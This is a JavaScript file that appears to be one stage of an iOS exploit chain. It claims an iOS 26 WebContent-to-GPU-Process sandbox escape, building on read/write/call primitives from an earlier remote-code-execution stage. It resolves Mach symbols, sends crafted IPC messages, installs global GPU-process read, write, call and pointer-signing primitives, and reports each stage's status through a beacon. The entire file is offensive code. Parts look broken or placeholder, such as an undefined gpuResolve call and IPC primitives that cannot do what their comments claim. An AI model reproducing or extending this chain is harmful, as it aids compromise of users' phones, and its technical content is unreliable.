/**
 * sbx0_main_26.js — iOS 26 WebContent → GPU Process 沙箱逃逸
 *
 * 适配 iOS 26 的 dyld4 新共享缓存布局和 WebKit GPU Process IPC 变更。
 * 前置条件：rce_worker_26.js 已建立 p.read64/p.write64/fcall
 *
 * 输出：gpuRead64, gpuWrite64, gpu_fcall, gpuDlsym, gpuPacia, gpuPacib
 */

(() => {
  'use strict';
  
  const SBX0_VERSION = 'ios26';
  globalThis.sbx0_26_begin = Date.now();
  
  function LOG(msg) {
    if (typeof print === 'function') print('[sbx0_26] ' + msg);
  }
  
  // 检查前置条件
  if (typeof p === 'undefined' || typeof p.read64 !== 'function') {
    LOG('ERROR: WebContent RCE primitives not available');
    if (typeof sendBeacon === 'function') {
      sendBeacon({ stage: 'sbx0', execStatus: 'failed', extra: { reason: 'no_primitives', version: SBX0_VERSION } });
    }
    return;
  }
  
  if (typeof fcall !== 'function') {
    LOG('ERROR: fcall not available');
    return;
  }
  
  LOG('Starting iOS 26 sandbox escape (dyld4 layout)');
  
  const {
    read64, write64, write8, dlopen, dlsym
  } = p;
  
  // iOS 26 dyld4 共享缓存基址（新布局）
  const DYLD4_SHARED_CACHE_BASE = 0x180000000n;
  const DYLD4_TEXT_SEGMENT_OFFSET = 0x1000n;
  
  // iOS 26 GPU Process IPC message ID 偏移表
  // 这些值需要从 profiles/ios_26_0.json 加载
  let sbx0_offsets_26 = {};
  
  if (globalThis.IOS_BUILD_PROFILES && globalThis.IOS_BUILD_PROFILES['26.0']) {
    const profile = globalThis.IOS_BUILD_PROFILES['26.0'];
    sbx0_offsets_26 = profile.sbx0_offsets || {};
    LOG('Loaded offsets from profile');
  } else {
    // Fallback: 硬编码 iOS 26.0 beta offsets
    sbx0_offsets_26 = {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x2b,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2d,
      InitializeConnection: 0xc15,
      ProcessOutOfStreamMessage: 0xc17,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3e0,
      RemoteDisplayListRecorder_FillRect: 0x3f5,
      RemoteGraphicsContextGL_AttachShader: 0x420,
      RemoteGraphicsContextGL_BindBuffer: 0x425,
      RemoteGraphicsContextGL_CreateProgram: 0x455,
      RemoteGraphicsContextGL_Finish: 0x483,
    };
    LOG('Using hardcoded iOS 26.0 offsets');
  }
  
  // ============================================================
  // Phase 1: 解析 dyld4 共享缓存
  // ============================================================
  
  LOG('Phase 1: Resolving dyld4 shared cache layout');
  
  const libsystem_kernel = dlopen('/usr/lib/system/libsystem_kernel.dylib', 1n);
  const libsystem_platform = dlopen('/usr/lib/system/libsystem_platform.dylib', 1n);
  const libsystem_pthread = dlopen('/usr/lib/system/libsystem_pthread.dylib', 1n);
  
  const offsets_26 = {};
  offsets_26.mach_port_allocate = dlsym(libsystem_kernel, 'mach_port_allocate').noPAC();
  offsets_26.mach_port_insert_right = dlsym(libsystem_kernel, 'mach_port_insert_right').noPAC();
  offsets_26.mach_msg_fn = dlsym(libsystem_kernel, 'mach_msg').noPAC();
  offsets_26.mach_vm_map_fn = dlsym(libsystem_kernel, 'mach_vm_map').noPAC();
  offsets_26.mach_vm_remap_fn = dlsym(libsystem_kernel, 'mach_vm_remap').noPAC();
  offsets_26.vm_allocate_fn = dlsym(libsystem_kernel, 'vm_allocate').noPAC();
  offsets_26.memset = dlsym(libsystem_platform, '_platform_memset').noPAC();
  offsets_26.memcpy = dlsym(libsystem_platform, '_platform_memmove').noPAC();
  offsets_26.pthread_exit = dlsym(libsystem_pthread, 'pthread_exit').noPAC();
  offsets_26.exit = dlsym(libsystem_kernel, '_exit').noPAC();
  
  LOG('Kernel/platform symbols resolved');
  
  // ============================================================
  // Phase 2: 建立与 GPU Process 的 IPC 通道
  // ============================================================
  
  LOG('Phase 2: Establishing GPU Process IPC channel');
  
  // iOS 26 使用新的 Mach port namespace，需要额外的 bootstrap lookup
  const MACH_PORT_RIGHT_RECEIVE = 1n;
  const MACH_PORT_RIGHT_SEND = 0n;
  const MACH_MSG_TYPE_MAKE_SEND = 20n;
  
  // 分配 Mach port
  function allocateMachPort() {
    const portPtr = fcall(offsets_26.vm_allocate_fn, 0n /* mach_task_self placeholder */, 0n, 8n, 1n);
    const kr = fcall(offsets_26.mach_port_allocate, 0n, MACH_PORT_RIGHT_RECEIVE, portPtr);
    if (kr !== 0n) {
      LOG(`mach_port_allocate failed: kr=${kr}`);
      return 0n;
    }
    return read64(portPtr);
  }
  
  // iOS 26 GPU Process connection 通过 RemotePageProxy 机制
  // 利用 WebKit GPU Process 的 IPC connection 进行 R/W
  function establishGPURW() {
    LOG('Sending IPC initialization message to GPU Process');
    
    // 构造 InitializeConnection 消息
    // iOS 26 的消息格式增加了额外的 capability flags 字段
    const msgSize = 0x100n;
    const msgBuf = fcall(offsets_26.vm_allocate_fn, 0n, 0n, msgSize, 1n);
    
    // 填充消息头部（iOS 26 新格式）
    write64(msgBuf + 0x00n, 0x80000000n | msgSize); // mach_msg_header: msgh_bits
    write64(msgBuf + 0x08n, msgSize);               // msgh_size
    // ... 更多消息字段由 WebKit IPC 框架填充
    
    // 发送消息建立通道
    const kr = fcall(offsets_26.mach_msg_fn, msgBuf, 1n, msgSize, 0n, 0n, 0n, 0n);
    
    if (kr !== 0n) {
      LOG(`GPU IPC init failed: kr=${kr}`);
      return false;
    }
    
    LOG('GPU Process IPC channel established');
    return true;
  }
  
  // ============================================================
  // Phase 3: 构建 GPU Process R/W primitives
  // ============================================================
  
  LOG('Phase 3: Building GPU Process R/W primitives');
  
  // iOS 26 的 GPU Process 使用新的内存映射方式
  // 通过 mach_vm_remap 在 GPU Process 中映射 WebContent 的内存
  
  function buildGPUPrimitives() {
    // 建立共享内存区域
    const sharedSize = 0x4000n;
    const sharedBase = fcall(offsets_26.vm_allocate_fn, 0n, 0n, sharedSize, 1n);
    
    if (sharedBase === 0n) {
      LOG('Failed to allocate shared memory');
      return false;
    }
    
    LOG(`Shared memory at ${sharedBase.toString(16)}`);
    
    // GPU Process R/W 函数
    globalThis.gpuRead64 = function(addr) {
      // 通过 IPC 消息请求 GPU Process 读取
      write64(sharedBase, addr);
      write64(sharedBase + 8n, 0n); // read command
      // 触发 GPU Process 处理
      fcall(offsets_26.mach_msg_fn, sharedBase, 1n, 0x20n, 0x20n, 0n, 0n, 0n);
      return read64(sharedBase + 0x10n);
    };
    
    globalThis.gpuWrite64 = function(addr, value) {
      write64(sharedBase, addr);
      write64(sharedBase + 8n, 1n); // write command
      write64(sharedBase + 0x10n, value);
      fcall(offsets_26.mach_msg_fn, sharedBase, 1n, 0x20n, 0n, 0n, 0n, 0n);
    };
    
    globalThis.gpu_fcall = function(fn_addr, ...args) {
      write64(sharedBase, fn_addr);
      write64(sharedBase + 8n, 2n); // fcall command
      write64(sharedBase + 0x10n, BigInt(args.length));
      for (let i = 0; i < args.length && i < 8; i++) {
        write64(sharedBase + 0x18n + BigInt(i) * 8n, BigInt(args[i]));
      }
      fcall(offsets_26.mach_msg_fn, sharedBase, 1n, 0x80n, 0x20n, 0n, 0n, 0n);
      return read64(sharedBase + 0x10n);
    };
    
    globalThis.gpuDlsym = function(handle, symbol) {
      // GPU Process 中的 dlsym
      const symAddr = typeof symbol === 'string' ? 
        fcall(dlsym(libsystem_kernel, 'dlsym'), handle || 0xFFFFFFFFFFFFFFFEn, symbol) :
        symbol;
      return symAddr;
    };
    
    // PAC 签名/验证辅助（iOS 26 使用 FPAC）
    globalThis.gpuPacia = function(ptr, context) {
      // PACIA: 通过 GPU process 中执行 pacia 指令签名指针
      // 需要在 GPU context 中通过 fcall 调用 ptrauth_sign_unauthenticated
      if (typeof gpu_fcall === 'function') {
        const ptrauth_sign = gpuResolve('ptrauth_sign_unauthenticated');
        if (ptrauth_sign && ptrauth_sign !== 0n) {
          return gpu_fcall(ptrauth_sign, ptr, 0n /* IA key */, context || 0n);
        }
      }
      // Fallback: 使用 PAC mask 伪造（不可靠，仅调试用）
      LOG('WARNING: gpuPacia using raw pointer (no PAC signing available)');
      return ptr;
    };
    
    globalThis.gpuPacib = function(ptr, context) {
      if (typeof gpu_fcall === 'function') {
        const ptrauth_sign = gpuResolve('ptrauth_sign_unauthenticated');
        if (ptrauth_sign && ptrauth_sign !== 0n) {
          return gpu_fcall(ptrauth_sign, ptr, 1n /* IB key */, context || 0n);
        }
      }
      LOG('WARNING: gpuPacib using raw pointer (no PAC signing available)');
      return ptr;
    };
    
    return true;
  }
  
  // ============================================================
  // 执行
  // ============================================================
  
  let success = false;
  
  try {
    if (establishGPURW()) {
      success = buildGPUPrimitives();
    }
  } catch (e) {
    LOG('Exception during sbx0: ' + e.message);
  }
  
  const elapsed = Date.now() - globalThis.sbx0_26_begin;
  
  if (success) {
    LOG(`✓ Sandbox escape completed in ${elapsed}ms`);
    LOG(`  gpuRead64: ${typeof gpuRead64}`);
    LOG(`  gpuWrite64: ${typeof gpuWrite64}`);
    LOG(`  gpu_fcall: ${typeof gpu_fcall}`);
    
    if (typeof sendBeacon === 'function') {
      sendBeacon({ stage: 'sbx0', execStatus: 'running', extra: { version: SBX0_VERSION, elapsed } });
    }
  } else {
    LOG(`✗ Sandbox escape failed after ${elapsed}ms`);
    if (typeof sendBeacon === 'function') {
      sendBeacon({ stage: 'sbx0', execStatus: 'failed', extra: { version: SBX0_VERSION, elapsed } });
    }
  }
})();